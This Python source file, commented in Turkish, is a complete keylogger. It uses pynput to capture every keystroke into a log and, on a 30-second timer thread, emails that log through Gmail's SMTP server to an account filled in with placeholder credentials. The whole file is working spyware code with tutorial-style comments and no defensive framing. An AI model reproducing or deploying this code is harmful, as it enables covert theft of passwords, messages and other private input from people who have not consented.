import pynput.keyboard

import smtplib  #mail atmak için kullanıyoruz.

import threading



log = ""



def callback_function(key):

    global log

    try:

        #log = log + key.char.encode('utf-8')  encodedan bite çevirme.

        log = log + str(key.char)

    except AttributeError:

        if key == key.space:

            log = log + " "

        else:

            log = log + str(key)

    except:

        pass



    print(log)



def send_email(email,password,message):

    email_server = smtplib.SMTP("smtp.gmail.com",587)  #server ve port bilgisi

    email_server.starttls()  #güvenli bir bağlantı oluşturmak için.

    email_server.login(email,password) #giriş

    email_server.sendmail(email,email,message) #mail gönderimi

    email_server.quit()



#thread - threading



def thread_function(): #paralelde işlem yapıp programı ve logu kitlememek için functşon tanımlarız.

    global log

    send_email("user@gmail.com", "password", log.encode('utf-8')) #encode ederek yollamak zorundayız.

    log = "" #mail olarak gönderilen logu boşaltma işlemi aynı şeyi göndermek istemeyiz.

    timer_object = threading.Timer(30,thread_function) #2 referans alır zaman aralığı ve fonkisyon.

    timer_object.start()



keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:

    thread_function()

    keylogger_listener.join()
